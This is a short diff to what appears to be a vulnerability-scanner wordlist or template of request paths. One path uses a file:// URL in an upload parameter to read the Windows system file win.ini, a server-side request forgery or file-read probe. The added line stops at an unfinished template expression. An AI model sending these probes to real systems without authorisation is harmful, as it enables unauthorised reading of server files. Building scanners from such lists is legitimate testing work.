@@ -1,1 +1,2 @@
 /doc/upload?token=testtoken&url=file:///C:/windows/win.ini&name={{file}}.txt
+/volume/stream/Rmx1aWc=/{{base64(
